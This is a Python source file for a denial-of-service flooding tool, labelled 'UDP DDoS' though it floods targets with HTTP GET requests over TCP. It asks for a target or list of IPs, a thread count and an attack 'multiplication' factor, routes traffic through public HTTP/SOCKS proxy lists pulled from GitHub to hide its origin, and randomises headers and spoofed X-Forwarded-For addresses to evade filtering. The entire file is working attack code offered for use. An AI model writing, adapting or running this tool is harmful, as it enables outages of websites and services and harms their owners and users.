import os
import sys

from socket import socket, AF_INET, SOCK_STREAM
from traceback import print_exc
from socks import setdefaultproxy, socksocket, PROXY_TYPE_SOCKS5, PROXY_TYPE_SOCKS4
from threading import Thread
from random import choice, randint
from requests import get
from re import split, match
from concurrent.futures import ThreadPoolExecutor

print("""
            |  |
            |  |
            \  /
             \/


""")
print("""     
           \ == /
            |  |
            |  |
            \  /
             \/


""")
print("""
           |\**/|      
           \ == /
            |  |
            |  |
            \  /
             \/


""")
print("""

           |\**/|      
           \ == /
            |  |
            |  |
            \  /
             \/


""")
print("""


           |\**/|      
           \ == /
            |  |
            |  |
            \  /
             \/


""")
print("""



           |\**/|      
           \ == /
            |  |
            |  |
            \  /
             \/


""")
print("""



           |\**/|      
           \ == /
            |  |
            |  |
            \  /
             \/

_______________________________
""")
print("""



           |\**/|      
           \ == /
            |  |
            |  |
            \  /
             \/
_______________________________
""")
print("""



           |\**/|      
           \ == /
            |  |
            |  |
            \  /
_____________\/_______________
""")
print("""

         _ ._  _ , _ ._
      (_ ' ( `  )_  .__)
    ( (  (    )   `)  ) _)
   (__ (_   (_ . _) _) ,__)
        `~~`\ ' . /`~~`
             ;   ;
             /   \
____________/_ __ \____________
______________________________
""")
print("""

       _.-^^---....,,--       
   _--                  --_  
  <                        >)
  |                         | 
   \._                   _./  
      ```--. . , ; .--'''       
            | |   |             
         .-=||  | |=-.   
         `-=#$%&%$#=-'   
            | ;  :|     
________.,-#%&$@%#&#~,.________
_______________________________
""")

red = "\033[1;91m"
green = "\033[1;92m"
white = "\033[1;97m"
orange = "\033[1;31m"
end = "\033[1;92m"

design = f"{orange}█████{white}█████{green}█████{end}"

print(f'''
{white}
       _.-^^---....,,--       
   _--                  --_  
  <                        >)
  |                         | 
   \._                   _./  
      ```--. . , ; .--'''       
            | |   |             
         .-=||  | |=-.   
         `-=#$%&%$#=-'   
            | ;  :|     
________.,-#%&$@%#&#~,.________
_______________________________
___________ UDP DDoS __________


    {design * 4}

	''')  # The graphics are there


useragents = open('headers.txt', 'r+').readlines()

http_proxies = get(
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text.split("\n")
socks4_proxy = get(
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt").text.split("\n")
socks5_proxy = get(
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt").text.split("\n")


def Main_Menu(): 
    global url
    global url2
    global urlport
    global chosen
    global ips
    global threads
    global multiple
    global use_proxy
    global anonymity
    global socks_mode
    global proxy_mode

    use_proxy, proxy_mode = False, False

    URL_REGEX = r'http[s]?:\/\/([\w]*[\.])*[a-z0-9]+\.\w+'
    IP_REGEX = r"[\d]{0,3}\.[\d]{0,3}\.[\d]{0,3}\.[\d]{0,3}"

    print("\033[92m")

    try:
        while 1:
            try:
                chosen = int(input(f"\n{green}Do you want one target [0] or more[1] > {end}"))
            except ValueError:
                print(f"{red}Use integers Only!!!{end}")
            if chosen == 1:
                ip_file = input(f"{green}Insert txt file of ips > {end}")
                ips = open(ip_file, "r").readlines()
                break
            elif chosen == 0:
                while 1:             # Automatically detect whether input is IP or URL
                    url = input(f"\n{green}Please Enter URL/IPv4 Address: {end}").strip()
                    if match(URL_REGEX, url):
                        break
                    elif match(IP_REGEX, url):
                        break
                    else:
                        print(f"{red}Pattern Error, please enter correct URL/IPv4 Address{end}")

                url2 = split(r"://", url)[1]

                try:
                    urlport = url.split(":")[2] # directly get port if exist
                except:
                    urlport = "80"

                break # Gets out of Loop
            else:
                print(f"{red}Invalid Options!!!{end}")
    except KeyboardInterrupt:
        print(f"{red}KeyboardInterrupt Detected, Exiting...{end}")
        exit()
    except Exception as e:  # If something goes wrong
        print(f"{red}Error: {e}{end}")

    while 1:
        anonymous = input("\nDo you want to use SOCKS4/5 or proxy [y/n] > ").lower()
        if anonymous == "y":
            use_proxy = True
            try:
                while 1:
                    type = int(input(f"{green}Choose [0] for SOCKS4/5 or [1] proxy > "))
                    if type == 0:
                        socks_mode = True
                        sock_type = int(input(f"{green}Choose [0] for SOCKS4 or [1] for SOCKS5 > "))
                        if sock_type == 0:
                            anonymity = socks4_proxy
                            break
                        elif sock_type == 1:
                            anonymity = socks5_proxy
                            break
                        else:
                            print(f"{red}You mistype, try again.")
                    elif type == 1:
                        proxy_mode = True
                        anonymity = http_proxies
                        break
                    else:
                        print(f"{red}You mistyped, try again.")

            except TypeError:
                print(f"{red}please enter integers only;") 
            break

        elif chosen == "n":
            use_proxy = False
            break

        else:
            print("You mistyped, try again.")

    try:
        threads = int(input("Insert number of threads (800): "))
    except ValueError:
        threads = 800
        print("800 threads selected.\n")

    while 1:
        try:
            multiple = int(input(f"{green}Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: {end}"))
            break
        except ValueError:
            print("You mistyped, try again.\n")

    try:
        input(f"{green}PRESS ANY KEY TO CONTINUE OR CTRL+C TO CANCEL > {end}")
        start_attack()
    except KeyboardInterrupt:
        print("\n\n\033[91mCanceled!\033[0m")

def start_attack():
    try:
        global acceptall
        global connection

        acceptall = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept-Encoding: gzip, deflate\r\n",
            "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
            "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
            "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
            "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
            "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
            "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
            "Accept: text/html, application/xhtml+xml",
            "Accept-Language: en-US,en;q=0.5\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
            "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        ] # Header Accept at random to make the requests look more legitimate
        # the Keep Alive always is useful to LOL
        connection = "Connection: Keep-Alive\r\n"  #ThanksTherunixx,MyFriend

        ThreadPool = ThreadPoolExecutor(max_workers=threads)
        if use_proxy: # If we have chosen the proxying mode
            if proxy_mode: # And we chose the HTTP Proxy
                with ThreadPool as executor:
                    for i in range(threads):
                        executor.submit(RequestProxyHTTP(i+1).launch) # Start the special class                   
                        # This starts threads as soon as they are all ready
                    print(f"{ThreadPool._max_workers} Threads initialized")
                # for i in range(threads):
                #     threads_init[i].start() 
            elif socks_mode: # If we have chosen the SOCKS
                with ThreadPool as executor:
                    for i in range(threads):
                        executor.submit(RequestSocksHTTP(i+1).launch) # Start the special class                    
                    # This starts threads as soon as they are all ready
                    print(f"{ThreadPool._max_workers} Threads initialized")
                    # This starts threads as soon as they are all ready
            else: # otherwise send normal non -proxate requests.
                with ThreadPool as executor:
                    for i in range(threads):
                        executor.submit(RequestDefaultHTTP(i+1).launch) # Start the special class                    
                    # This starts threads as soon as they are all ready
                    print(f"{ThreadPool._max_workers} Threads initialized")
                #This starts threads as soon as they are all ready
    except Exception as e:
        print(print_exc())

class RequestProxyHTTP:  #The Multithreading class

    def __init__(self, counter):  # Function put on practically only for the Threads Counter.The Council of the Function passes, passes the X+1 above as the Counter variable        
        self.counter = counter

    def launch(self):# the function that gives the instructions to the various threads
        useragent = "User-Agent: " + \
            choice(useragents) + "\r\n"  # scelta useragent a caso
        accept = choice(acceptall)  # scelta header accept a caso
        randomip = str(randint(0, 255)) + "." + str(randint(0, 255)) + \
            "." + str(randint(0, 255)) + "." + \
            str(randint(0, 255))
        # X-forward-for, a HTTP Header that allows you to increase anonymity (see Google for info)
        forward = "X-Forwarded-For: " + randomip + "\r\n"
        if chosen == "1":
            ip = choice(ips)
            get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
        else:
            get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
        request = get_host + useragent + accept + forward + connection + "\r\n" # Here is the Final Request
        # wait for threads to be ready
        while 1:  # infinite loop
            proxy = choice(anonymity).strip().split(":")
            try:
                # Here is our socket
                s = socket(AF_INET, SOCK_STREAM)
                # connection to the proxy
                s.connect((str(proxy[0]), int(proxy[1])))
                #Encode In Bytes Della Richiest a HTTP
                s.send(str.encode(request))
                # Print of requests
                print(f"Request sent from {proxy[0]}:{proxy[1]} >> {self.counter}")
                # current+=1
                try:  # Send other requests in the same thread
                    for y in range(multiple):  # multiplication factor
                        # encode In Bytes DellaRichiest a HTTPtaHttp
                        s.send(str.encode(request))
                        # current+=y
                except:  # If something goes wrong, closes the socket and the cycle starts again
                    s.close()
            except:
                s.close() # If something goes wrong, closes the socket and the cycle starts again

class RequestSocksHTTP:# The Multithreading class
    def __init__(self, counter):  # Function put on practically only for the Threads Counter.The Council of the Function passes, passes the X+1 above as the Counter variable
        self.counter = counter

    def launch(self):  # the function that gives the instructions to the various threads
        useragent = "User-Agent: " + \
            choice(useragents) + "\r\n"  # READY PROXY CHOICE
        accept = choice(acceptall) # CHOICE CHOICE A random
        if chosen == "1":
            ip = choice(ips)
            get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
        else:
            get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
        request = get_host + useragent + accept + \
            connection + "\r\n" # Final Request Composition      
        # wait for threads to be ready
        while 1:
            proxy = choice(anonymity).strip().split(":")
            try:
                setdefaultproxy(PROXY_TYPE_SOCKS5, str(proxy[0]), int(
                    proxy[1]), True)  # Command to Proxat us with the SOCKS
                s = socksocket() # Socket creation with pysocks
                s.connect((str(url2), int(urlport)))  # connection
                s.send(str.encode(request)) # Send
                #PrintReq +Counter
                print(f"\nRequest sent from {proxy[0]+':'+proxy[1]} >> {self.counter}")
                try:  #Send other requests in the same thread
                    for y in range(multiple): # Multiplication factor
                        # Encode in bytes of the HTTP request
                        s.send(str.encode(request))
                except:  # If something goes wrong, closes the socket and the cycle starts again
                    s.close()
            except: # If something goes wrong, this Except closes the socket and connects to the Try below
                s.close() # Closes Socket
                try: # the Try tries to see if the error is caused by the type of Errata SOCKS, in fact try with SOCKS4
                    setdefaultproxy(PROXY_TYPE_SOCKS4, str(
                        proxy[0]), int(proxy[1]), True)# Test with SOCKS4
                    s = socksocket() # Creation New Socket
                    s.connect((str(url2), int(urlport))) # connection
                    s.send(str.encode(request)) # Send
                    # print req + counter
                    print("Request sent from " +
                            str(proxy[0]+":"+proxy[1]) + " @", self.counter)
                    try: # Send other requests in the same thread
                        for y in range(multiple):# Multiplication factor
                            # encode in bytes della richiesta HTTP
                            s.send(str.encode(request))
                    except:  # If something goes wrong, closes the socket and the cycle starts again
                        s.close()
                except:
                    print("Sock down. Retrying request. @", self.counter)
                    # If not even with that Try he managed to send anything, then the SOCK is down and closes the socket.
                    s.close()


class RequestDefaultHTTP: # The Multithreading class

    def __init__(self, counter): # Function put on practically only for the Threads Counter.The Council of the Function passes, passes the X+1 above as the Counter variable
        Thread.__init__(self)
        self.counter = counter

    def launch(self): # the function that gives the instructions to the various threads
        useragent = "User-Agent: " + \
            choice(useragents) + "\r\n" # Useragent Case
        accept = choice(acceptall)  # accept a case
        if chosen == "1":
            ip = choice(ips)
            get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
        else:
            get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
        request = get_host + useragent + accept + \
            connection + "\r\n"  #Final Request composition
        #wait for threads to be ready        
        while 1:
            try:
                # socket creation
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((str(url2), int(urlport)))  #connection
                s.send(str.encode(request))  #sending
                print("Request sent! @", self.counter)  # printReq +Counter
                try:  # Send other requests in the same thread
                    for y in range(multiple):  #multiplication factor
                        # encode in bytes della richiesta HTTP
                        s.send(str.encode(request))
                except:  # If something goes wrong, closes the socket and the cycle starts again
                    s.close()
            except:  #If something goes wrong
                s.close()  # Closes Socket and starts again


if __name__ == '__main__':
    Main_Menu()
